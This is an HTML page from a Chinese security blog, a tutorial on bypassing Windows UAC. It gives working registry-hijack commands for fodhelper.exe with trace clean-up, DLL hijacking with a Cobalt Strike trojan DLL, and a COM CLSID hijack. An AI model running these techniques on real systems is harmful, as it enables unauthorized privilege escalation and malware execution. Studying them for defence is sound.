@@ -1,0 +1,510 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <meta name="theme-color" content="#3367D6"/>
+  <link rel="apple-touch-icon" href="/icons-192.png">
+  <link rel="manifest" href="/manifest.json">
+  
+  <meta name="generator" content="Hexo 5.4.2">
+
+  
+    <meta name="description" content="No matter how far you may fly, never forget where you come from.">
+  
+
+  
+
+  
+    <meta name="author" content="WsyKer">
+  
+
+  
+
+  
+
+  <title>Windows UAC - Bypass | WsyKer&#39;s Blog</title>
+
+  
+
+  
+    <link rel="shortcut icon" href="/favicon.ico">
+  
+
+  
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@1.1.3/index.min.css">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlightjs@9.16.2/styles/monokai.css">
+  
+
+  
+<link rel="stylesheet" href="/css/style.css">
+
+</head>
+<body>
+  <div class="root-container">
+    
+<!-- header container -->
+<header class="header-container post">
+  
+    <div class="post-image" style="background-image: url(https://wsyker.oss-cn-beijing.aliyuncs.com/img/blog/title.jpg)"></div>
+  
+
+  <!-- navbar -->
+<nav class="navbar">
+  <div class="navbar-content">
+    <!-- logo -->
+    <div class="navbar-logo">
+      <a href="/">
+        
+          WsyKer&#39;s Blog
+        
+      </a>
+    </div>
+    <!-- link -->
+    <div class="navbar-link">
+      <div class="navbar-btn">
+        <div></div>
+        <div></div>
+        <div></div>
+      </div>
+      <ul class="navbar-list">
+        
+          <li class="navbar-list-item"><a href="/">首页</a></li>
+        
+          <li class="navbar-list-item"><a href="/links">友链</a></li>
+        
+          <li class="navbar-list-item"><a href="/about">关于</a></li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+  
+
+  
+  
+
+  
+  
+
+  
+  
+
+  
+  
+    <div class="header-content">
+      <div class="post-text layout-block">
+        <div class="layout-margin">
+          <h1 class="title-wrap">Windows UAC - Bypass</h1>
+          <h2 class="title-sub-wrap">
+            <strong>WsyKer</strong>
+            <span>发布于</span>
+            <time  class="article-date" datetime="2022-07-07T16:51:36.000Z" itemprop="datePublished">2022-07-08</time>
+          </h2>
+          <ul class="wrap-list dark">
+  
+    <li><a href="/categories/%E6%9D%80%E8%BD%AF%E5%AF%B9%E6%8A%97/">📒 杀软对抗</a></li>
+  
+</ul>
+          <ul class="wrap-list dark">
+  
+    <li><a href="/tags/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/">🏷️ 内网安全</a></li>
+  
+</ul>
+        </div>
+      </div>
+    </div>
+  
+
+  
+  
+  
+</header>
+
+    <!-- 文章 -->
+
+<!-- 文章内容 -->
+<div class="body-container">
+  <article class="content-container layout-block post-container">
+    <div class="article-info">
+      
+      
+      
+      
+      <section class="article-entry markdown-body layout-margin content-padding--large soft-size--large soft-style--box">
+        <h2 id="一、介绍"><a href="#一、介绍" class="headerlink" title="一、介绍"></a>一、介绍</h2><p>（User Account Control）简称UAC，中文名为用户帐户控制，是微软公司在其Windows Vista及更高版本操作系统中采用的一种控制机制，通过弹框进一步让用户确认是否授权当前可执行文件来达到阻止恶意程序的目的，使用UAC，应用程序和任务总是在非管理员帐户的安全上下文中运行，例如，Windows资源管理器会自动继承标准用户级别权限，直接双击打开一个应用程序，系统会使用标准用户权限组进行运行，UAC通过限制应用软件对系统层级的访问从而提高Windows系统的安全性。</p>
+<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/uac/1.png" alt="1"></p>
+<h2 id="二、前置知识"><a href="#二、前置知识" class="headerlink" title="二、前置知识"></a>二、前置知识</h2><h3 id="登录过程："><a href="#登录过程：" class="headerlink" title="登录过程："></a>登录过程：</h3><p>默认情况下，普通用户和管理员用户都是以标准用户的安全上下文中访问资源并运行应用，当普通用户登录到计算机时，系统会自动为普通用户创建标准用户访问令牌，访问令牌其中包含用户访问级别信息、安全标识符 (SID) 和Windows权限，当管理员登录到计算机时，会创建两个单独访问的令牌，标准用户访问令牌和管理员访问令牌，其两个令牌的身份信息相同，不过安全标识符 (SID) 和Windows权限将被删除，标准用户访问令牌用于启动不执行管理任务的应用 (标准用户应用) 。 然后使用标准用户访问令牌来显示桌面 (explorer.exe) 。 Explorer.exe是所有其他用户发起的进程从中继承其访问令牌的父进程。 因此，除非用户提供同意或凭据来批准应用使用完整的管理访问令牌，否则所有应用都以标准用户身份运行。</p>
+<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/uac/2.gif" alt="2"></p>
+<h3 id="触发UAC条件："><a href="#触发UAC条件：" class="headerlink" title="触发UAC条件："></a>触发UAC条件：</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">配置Windows Update</span><br><span class="line">增加或删除用户账户</span><br><span class="line">改变用户的账户类型</span><br><span class="line">改变UAC设置</span><br><span class="line">安装ActiveX</span><br><span class="line">安装或移除程序</span><br><span class="line">安装设备驱动程序</span><br><span class="line">设置家长控制</span><br><span class="line">将文件移动或复制到Program Files或Windows目录</span><br><span class="line">查看其他用户文件夹</span><br><span class="line">更改注册表</span><br><span class="line">更改系统保护或者高级系统设置</span><br></pre></td></tr></table></figure>
+
+<h3 id="四种设计要求："><a href="#四种设计要求：" class="headerlink" title="四种设计要求："></a>四种设计要求：</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">始终通知：每当有程序 需要使⽤⾼级别的权限 时都会提示本地⽤户 </span><br><span class="line">仅在程序试图更改我的计算机时通知我：默认设置。本地windows程序要使用高级别的权限时，不会通知用户。当第三⽅程序使⽤⾼级别的权限时会提示本地⽤户</span><br><span class="line">仅在程序试图更改我的计算机时通知我（不降低桌⾯的亮度）：与上相同，但提示时不降低桌⾯的亮度 </span><br><span class="line">从不提示：当⽤户为系统管理员时，所有程序 都会以最⾼权限运⾏</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="三、Bypass"><a href="#三、Bypass" class="headerlink" title="三、Bypass"></a>三、Bypass</h2><h3 id="白名单："><a href="#白名单：" class="headerlink" title="白名单："></a>白名单：</h3><h4 id="注册表劫持"><a href="#注册表劫持" class="headerlink" title="注册表劫持"></a>注册表劫持</h4><p>Windows会通过consent.exe进程来确定启动程序是否在白名单内，如果是在白名单内，则不会弹出UAC框，白名单内的程序默认以管理员权限启动，启动时会读取注册表HKCR下的键值，根据值启动相应的进程，如果可以修改HKCR下的键值，把原本的键值改为cmd.exe，当高权限程序在运行过程中调用了键值，就会以高权限启动cmd.exe，常见高权限白名单程序：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">c:\windows\system32\bthudtask.exe </span><br><span class="line">c:\windows\system32\changepk.exe </span><br><span class="line">c:\windows\system32\ComputerDefaults.exe </span><br><span class="line">c:\windows\system32\dccw.exe </span><br><span class="line">c:\windows\system32\dcomcnfg.exe </span><br><span class="line">c:\windows\system32\DeviceEject.exe </span><br><span class="line">c:\windows\system32\DeviceProperties.exe </span><br><span class="line">c:\windows\system32\djoin.exe </span><br><span class="line">c:\windows\system32\easinvoker.exe </span><br><span class="line">c:\windows\system32\EASPolicyManagerBrokerHost.exe </span><br><span class="line">c:\windows\system32\eudcedit.exe </span><br><span class="line">c:\windows\system32\eventvwr.exe </span><br><span class="line">c:\windows\system32\fodhelper.exe </span><br><span class="line">c:\windows\system32\fsquirt.exe </span><br><span class="line">c:\windows\system32\FXSUNATD.exe </span><br><span class="line">c:\windows\system32\immersivetpmvscmgrsvr.exe </span><br><span class="line">c:\windows\system32\iscsicli.exe </span><br><span class="line">c:\windows\system32\iscsicpl.exe </span><br><span class="line">c:\windows\system32\lpksetup.exe </span><br><span class="line">c:\windows\system32\MSchedExe.exe </span><br><span class="line">c:\windows\system32\msconfig.exe </span><br><span class="line">c:\windows\system32\msra.exe </span><br><span class="line">c:\windows\system32\MultiDigiMon.exe </span><br><span class="line">c:\windows\system32\newdev.exe </span><br><span class="line">c:\windows\system32\odbcad32.exe </span><br><span class="line">c:\windows\system32\PasswordOnWakeSettingFlyout.exe </span><br><span class="line">c:\windows\system32\pwcreator.exe </span><br><span class="line">c:\windows\system32\rdpshell.exe </span><br><span class="line">c:\windows\system32\recdisc.exe </span><br><span class="line">c:\windows\system32\rrinstaller.exe </span><br><span class="line">c:\windows\system32\shrpubw.exe </span><br><span class="line">c:\windows\system32\slui.exe </span><br><span class="line">c:\windows\system32\Sysprep\sysprep.exe </span><br><span class="line">c:\windows\system32\SystemPropertiesAdvanced.exe </span><br><span class="line">c:\windows\system32\SystemPropertiesComputerName.exe </span><br><span class="line">c:\windows\system32\SystemPropertiesDataExecutionPrevention.exe </span><br><span class="line">c:\windows\system32\SystemPropertiesHardware.exe </span><br><span class="line">c:\windows\system32\SystemPropertiesPerformance.exe </span><br><span class="line">c:\windows\system32\SystemPropertiesProtection.exe </span><br><span class="line">c:\windows\system32\SystemPropertiesRemote.exe </span><br><span class="line">c:\windows\system32\SystemSettingsAdminFlows.exe </span><br><span class="line">c:\windows\system32\SystemSettingsRemoveDevice.exe </span><br><span class="line">c:\windows\system32\Taskmgr.exe </span><br><span class="line">c:\windows\system32\tcmsetup.exe</span><br><span class="line">c:\windows\system32\TpmInit.exe </span><br><span class="line">c:\windows\system32\WindowsUpdateElevatedInstaller.exe </span><br><span class="line">c:\windows\system32\WSReset.exe </span><br><span class="line">c:\windows\system32\wusa.exe</span><br><span class="line">C:\Windows\System32\fodhelper.exe</span><br></pre></td></tr></table></figure>
+
+<p>这里以fodhelper.exe为白名单例子，进行绕过UAC，需要注意的是，fodhelper.exe文件只有在Windows10才有，环境：Windows10专业版，预下载工具：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sigcheck.exe：https://docs.microsoft.com/en-us/sysinternals/downloads/sigcheck</span><br><span class="line">strings.exe：https://docs.microsoft.com/zh-cn/sysinternals/downloads/strings</span><br><span class="line">Process Monitor：https://www.xiazaiba.com/html/<span class="number">126100.</span>html<span class="comment">#downlist</span></span><br></pre></td></tr></table></figure>
+
+<ol>
+<li>使用sigcheck查看fodhelper.exe属性，因为只有具有AutoElevate属性，且为True的程序在运行时才会自动提升权限，执行时才会以管理员权限启动</li>
+</ol>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">findstr <span class="string">&quot;autoElevate&quot;</span> sigcheck64.exe -m c:\windows\system32\fodhelper.exe</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/uac/3.png" alt="3"></p>
+<ol start="2">
+<li>然后使用procmon查看ComputerDefaults.exe启动时读取的注册表项，使用过滤器添加进程名</li>
+</ol>
+<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/uac/4.png" alt="4"></p>
+<ol start="3">
+<li>然后 ctrl + f 搜索</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HKCU\Software\Classes\ms-settings\shell\open\command</span><br></pre></td></tr></table></figure>
+
+<ol start="4">
+<li>发现其结果为NAME NOT FOUND，表示找不到，因为实际这个路径根本不存在</li>
+</ol>
+<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/uac/5.png" alt="5"></p>
+<ol start="5">
+<li>然后又往下查询</li>
+</ol>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">HKCR\ms-settings\Shell\Open</span><br><span class="line">HKCR\ms-settings\Shell\Open\command</span><br><span class="line">HKCR\ms-settings\Shell\Open\command</span><br><span class="line">HKCR\ms-settings\Shell\Open\command</span><br></pre></td></tr></table></figure>
+
+<ol start="6">
+<li>这里可以直接在注册表里添加键值，路径：</li>
+</ol>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HKCU\Software\Classes\mscfile\shell\<span class="built_in">open</span>\command</span><br></pre></td></tr></table></figure>
+
+<ol start="7">
+<li>使用以下命令，将值指定到恶意程序，普通权限用户也可以完成此操作</li>
+</ol>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">reg add HKEY_CURRENT_USER\Software\Classes\ms-settings\shell\<span class="built_in">open</span>\command /d C:\Windows\System32\cmd.exe /f </span><br><span class="line">reg add HKEY_CURRENT_USER\Software\Classes\ms-settings\shell\<span class="built_in">open</span>\command /v DelegateExecute /t REG_DWORD /d <span class="number">00000000</span> /f</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/uac/6.png" alt="6"></p>
+<ol start="8">
+<li>这样子就劫持好了，打开fodhelper.exe文件就会自动打开高权限的cmd</li>
+</ol>
+<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/uac/7.png" alt="7"></p>
+<ol start="9">
+<li>清除痕迹</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg delete &quot;HKEY_CURRENT_USER\Software\Classes\ms-settings\shell\open\command&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/uac/8.png" alt="8"></p>
+<h4 id="odbcad32-exe"><a href="#odbcad32-exe" class="headerlink" title="odbcad32.exe"></a>odbcad32.exe</h4><p>odbcad32.exe，进程名称是Microsoft Data Access，位置在：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\system32\odbcad32.exe</span><br></pre></td></tr></table></figure>
+
+<p>普通权限用户可以直接打开</p>
+<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/uac/9.png" alt="9"></p>
+<p>然后点击跟踪，在日志文件路径处浏览CMD或者Powershell，成功Bypass，其实除了这个，还有别的白名单程序，只有有浏览文件的功能，都能启动一个高权限的窗口</p>
+<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/uac/10.png" alt="10"></p>
+<h3 id="DLL劫持："><a href="#DLL劫持：" class="headerlink" title="DLL劫持："></a>DLL劫持：</h3><p>应用程序在运行时会加载许多DLL文件，在应用程序寻找成功之前，将恶意DLL文件放入寻找目录中，那么应用程序就会加载恶意的DLL文件，从而达到高权限代码执行的目的，DLL文件的加载顺序是：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">程序所在目录</span><br><span class="line">系统目录即SYSTEM32目录</span><br><span class="line">16位系统目录即SYSTEM目录</span><br><span class="line">Windows目录</span><br><span class="line">程序加载目录(SetCurrentDirecctory)</span><br><span class="line">PATH环境变量中列出的目录</span><br></pre></td></tr></table></figure>
+
+<p>当然，加载顺序也要按着Know DLLs注册表项的机制，Know DLLs注册表项指的是已经被加载过的DLL，不会被应用程序重新搜索并加载，在以下注册表可以看到这些DLL文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLS</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/uac/11.png" alt="11"></p>
+<p>在knowdlls表项中的dll是预先就加载进内存空间的，被诸多应用调用，改动需要高权限，废话不多说，直接开始</p>
+<ol>
+<li>这里以SystemPropertiesAdvanced.exe文件为例，使用procmon进行筛选</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/uac/12.png" alt="12"></p>
+<ol start="2">
+<li>查看启动时加载的DLL，这里的DLL文件，都是尝试加载并且找不到的</li>
+</ol>
+<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/uac/13.png" alt="13"></p>
+<ol start="3">
+<li>以srrstr.dll为例子，使用Cobalt Strike生成DLL木马文件</li>
+</ol>
+<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/uac/14.png" alt="14"></p>
+<ol start="4">
+<li>使用生成好的木马，放到srrstr.dll所在路径，并且重命名为srrstr.dll</li>
+</ol>
+<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/uac/15.png" alt="15"></p>
+<ol start="5">
+<li>重新打开SystemPropertiesAdvanced.exe，按理Cobalt Strike上线成功，但是没有，懂得加我</li>
+</ol>
+<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/uac/16.png" alt="16"></p>
+<p>除了上述的，还有以下几种DLL利用方式</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">DLL替换：用恶意的DLL替换掉合法的DLL</span><br><span class="line">DLL搜索顺序劫持：当应用程序加载DLL的时候，如果没有带指定DLL的路径，那么程序将会以特定的顺序依次在指定的路径下搜索待加载的DLL。通过将恶意DLL放在真实DLL之前的搜索位置，就可以劫持搜索顺序，劫持的目录有时候包括目标应用程序的工作目录。</span><br><span class="line">虚拟DLL劫持：释放一个恶意的DLL来代替合法应用程序加载的丢失/不存在的DLL</span><br><span class="line">DLL重定向：更改DLL搜索的路径，比如通过编辑%PATH%环境变量或 .exe.manifest/.exe.local文件以将搜索路径定位到包含恶意DLL的地方。</span><br><span class="line">WinSxS DLL替换：将目标DLL相关的WinSxS文件夹中的恶意DLL替换为合法的DLL。此方法通常也被称为DLL侧加载</span><br><span class="line">相对路径DLL劫持：将合法的应用程序复制（并有选择地重命名）与恶意的DLL一起放入到用户可写的文件夹中。在使用方法上，它与（签名的）二进制代理执行有相似之处。它的一个变体是（有点矛盾地称为）“自带LOLbin”，其中合法的应用程序带有恶意的DLL（而不是从受害者机器上的合法位置复制）。</span><br></pre></td></tr></table></figure>
+
+<h3 id="COM劫持："><a href="#COM劫持：" class="headerlink" title="COM劫持："></a>COM劫持：</h3><p>COM，英文名：Component Object Model，中文名：组件对象模型，是微软公司为了计算机工业的软件生产更加符合人类的行为方式开发的一种新的软件开发技术。在COM构架下，人们可以开发出各种各样的功能专一的组件，然后将它们按照需要组合起来，构成复杂的应用系统，组件实际上是一些小的二进制可执行程序，它们可以给应用程序，操作系统以及其他组件提供服务。</p>
+<ul>
+<li>为什么要使用COM组件？</li>
+</ul>
+<p>com组件主要是解决了代码共用以及版本问题、能够调用其他软件的功能、所有代码都能够面向对象</p>
+<ul>
+<li>什么是CLSID？</li>
+</ul>
+<p>Class Identifier（类标识符）也称为CLASSID或CLSID，是标识 COM 类对象的全局唯一标识符，具体指Windows系统对于不同的应用程序，文件类型，OLE对象，特殊文件夹以及各种系组件分配的一个唯一表示他的ID代码，而当初微软在设计时，提供了两个选择来保证其唯一性，第一是成立一个类似Internet地址的管理机构，第二是GUID算法，每次都能产生一个全球唯一的COM组件标识符，而第一种不是很方便，最后微软选择了第二种</p>
+<ul>
+<li>COM与注册表的关系？</li>
+</ul>
+<p>应用程序在运行时会去加载指定CLSID的COM组件，此时程序会按照固定的顺序去读取注册表值，获得DLL或EXE路径，依次读取的顺序为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">HKEY_CURRENT_USER\Software\Classes\CLSID</span><br><span class="line">HKEY_CLASSES_ROOT\CLSID</span><br><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\ShellCompatibility\Objects\</span><br></pre></td></tr></table></figure>
+
+<p>言归正传，以fodhelper.exe为例，首先使用procmon进行监控</p>
+<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/uac/17.png" alt="17"></p>
+<p>然后搜索CLSID，发现执行该应用会寻找以下组件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;20D04FE0-3AEA-1069-A2D8-08002B30309D&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/uac/18.png" alt="18"></p>
+<p>但是这个键值默认是不存在的，所以可以在注册表中增加这个键，设置相应的值，从而劫持COM组件，这个操作和DLL劫持很像，但是COM组件的拓展性却比DLL劫持好很多，能够劫持如.com文件、pe文件、api文件等等，使用以下命令进行劫持：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add HKEY_CURRENT_USER\Software\Classes\CLSID\&#123;20D04FE0-3AEA-1069-A2D8-08002B30309D&#125;\InProcServer32 /v &quot;&quot; /t REG_SZ /d &quot;C:\artifact.dll&quot; /f </span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/uac/19.png" alt="19"></p>
+
+      </section>
+
+      
+      
+        <nav class="article-nav">
+          
+            <div class="article-nav-item layout-padding">
+  <article class="card-container article-nav-card content-padding--primary soft-size--large soft-style--box">
+    
+    <div class="card-text">
+      
+        <a href="/2022/07/10/defender/" itemprop="url">
+          <h2 class="card-text--title text-ellipsis">Windows Defender - Bypass</h2>
+        </a>
+      
+      <div class="card-text--row">Newer</div>
+    </div>
+  </article>
+</div>
+          
+          
+            <div class="article-nav-item layout-padding">
+  <article class="card-container article-nav-card content-padding--primary soft-size--large soft-style--box">
+    
+    <div class="card-text">
+      
+        <a href="/2022/07/04/esp8266/" itemprop="url">
+          <h2 class="card-text--title text-ellipsis">ESP8266 - Wifi杀手</h2>
+        </a>
+      
+      <div class="card-text--row">Older</div>
+    </div>
+  </article>
+</div>
+          
+        </nav>
+      
+
+      <section class="page-message-container layout-padding">
+        
+
+
+  
+  
+
+  
+  
+
+
+      </section>
+    </div>
+    <div class="widget-info">
+      <section class="widget-author widget-item layout-margin content-padding--primary soft-size--large soft-style--box">
+  <div class="widget-body">
+    
+      <img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/blog/blog.jpg" class="soft-size--round soft-style--box" alt="WsyKer">
+    
+    
+      <h2>WsyKer</h2>
+    
+    
+      <p>要做自己喜欢做的事</p>
+    
+
+    <div class="count-box">
+      <div class="count-box--item">
+        <svg class="icon icon-article" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+  <path d="M240.51564747 647.74217627h196.07203239c16.59071043 0 30.16492806-13.57421762 30.16492805-30.16492806V165.10332731c0-33.18142087-30.16492806-60.32985613-60.32985612-60.32985611H245.04038668C225.43318342 104.7734712 210.35071939 119.85593522 210.35071939 139.46313845V617.57724821c0 16.59071043 13.57421762 30.16492806 30.16492808 30.16492806z m663.62841731-452.47392089v482.63884894c0 33.18142087-27.14843525 60.32985613-60.32985612 60.32985613H180.18579134c-33.18142087 0-60.32985613-27.14843525-60.32985612-60.32985613V195.26825538c-49.77213131 0-90.49478418 40.72265287-90.49478417 90.49478417v452.4739209c0 49.77213131 40.72265287 90.49478418 90.49478417 90.49478417h286.56681657c16.59071043 0 30.16492806 13.57421762 30.16492807 30.16492807s13.57421762 30.16492806 30.16492805 30.16492806h90.49478418c16.59071043 0 30.16492806-13.57421762 30.16492805-30.16492806s13.57421762-30.16492806 30.16492807-30.16492807h286.56681657c49.77213131 0 90.49478418-40.72265287 90.49478417-90.49478417V285.76303955c0-49.77213131-40.72265287-90.49478418-90.49478417-90.49478417zM587.41232014 647.74217627h191.54729318c19.60720323 0 34.68966726-15.08246403 34.68966729-34.68966727V134.93839925c0-16.59071043-13.57421762-30.16492806-30.16492808-30.16492805H617.57724821c-30.16492806 0-60.32985613 27.14843525-60.32985612 60.32985611v452.4739209c0 16.59071043 13.57421762 30.16492806 30.16492805 30.16492806z" fill="currentColor"></path>
+</svg>
+        <span>9</span>
+      </div>
+      <div class="count-box--item">
+        <svg class="icon icon-categories" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+  <path d="M900.3614811 257.09082106h-339.81629553l-67.96326003-101.9448889c-19.41807444-29.12711113-48.54518557-43.69066667-82.52681443-43.69066667H123.6385189c-53.39970333 0-97.09036999 43.69066667-97.09037113 97.09036999v582.54222222c0 53.39970333 43.69066667 97.09036999 97.09037113 97.09037002h776.7229622c53.39970333 0 97.09036999-43.69066667 97.09037113-97.09037002V354.18119104c0-53.39970333-43.69066667-97.09036999-97.09037113-97.09036998z m-97.09036999 242.72592554H220.72888889c-24.27259221 0-48.54518557-24.27259221-48.54518556-48.54518556s24.27259221-48.54518557 48.54518556-48.54518444h582.54222222c24.27259221 0 48.54518557 24.27259221 48.54518556 48.54518444s-24.27259221 48.54518557-48.54518556 48.54518556z" fill="currentColor"></path>
+</svg>
+        6
+      </div>
+      <div class="count-box--item">
+        <svg class="icon icon-tags" viewBox="0 0 1098 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+  <path d="M283.42180005 272q0-28.38857157-20.09142843-48.48000001t-48.47999998-20.09142842-48.48000002 20.09142842-20.09142846 48.48000001 20.09142846 48.48 48.48000002 20.09142843 48.47999998-20.09142843 20.09142843-48.48zM855.0332285 580.57142843q0 28.38857157-19.81714313 48.2057147l-263.03999997 263.58857157q-20.9142853 19.81714313-48.75428534 19.81714312-28.38857157 0-48.20571468-19.81714312l-383.04-383.58857157q-20.36571468-19.81714313-34.55999999-54.10285688t-14.19428534-62.6742853l0-222.85714313q0-27.84000002 20.36571469-48.20571469t48.2057147-20.36571466l222.85714313 0q28.38857157 0 62.6742853 14.19428529t54.65142842 34.55999999l383.04000001 382.49142843q19.81714313 20.9142853 19.81714314 48.75428532zM1060.74751475 580.57142843q0 28.38857157-19.81714313 48.2057147l-263.04 263.58857157q-20.9142853 19.81714313-48.75428531 19.81714312-19.26857155 0-31.61142843-7.47428531t-28.38857159-24.13714314l251.79428534-251.7942853q19.81714313-19.81714313 19.81714308-48.20571469 0-27.84000002-19.81714308-48.75428531l-383.04000001-382.49142845q-20.36571468-20.36571468-54.65142842-34.55999999t-62.67428532-14.19428534l120 0q28.38857157 0 62.67428532 14.19428534t54.65142842 34.55999999l383.03999998 382.49142845q19.81714313 20.9142853 19.81714314 48.75428531z" fill="currentColor"></path>
+</svg>
+        3
+      </div>
+    </div>
+  </div>
+</section>
+
+      
+
+      
+<section class="widet-notice widget-item layout-margin content-padding--primary soft-size--large soft-style--box">
+  <div class="widget-title">
+    <svg class="icon icon-notice" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+  <path d="M512 945.02305225v28.15620663a24.27259221 24.27259221 0 0 1-24.27259221 24.27259335H394.0352a48.54518557 48.54518557 0 0 1-41.74885888-23.78714112l-110.68302222-184.47170332a132.04290333 132.04290333 0 0 1-17.47626667-48.54518557h118.4502511a200.97706667 200.97706667 0 0 1 76.21594113 14.56355556l20.38897777 133.49925888a48.54518557 48.54518557 0 0 0 36.40888888 27.67075555l16.01991111 2.91271112a24.27259221 24.27259221 0 0 1 20.38897778 25.72894889zM997.45185223 463.45481443a194.18074112 194.18074112 0 0 1-38.8361489 116.50844445 24.75804445 24.75804445 0 0 1-36.4088889 0l-34.95253333-34.95253333a24.27259221 24.27259221 0 0 1-2.91271111-30.58346667 97.09036999 97.09036999 0 0 0 0-106.79940665 24.27259221 24.27259221 0 0 1 2.91271111-30.58346666l34.95253333-34.95253334a24.75804445 24.75804445 0 0 1 18.93262223-7.28177777 26.2144 26.2144 0 0 1 17.47626667 9.70903665A194.18074112 194.18074112 0 0 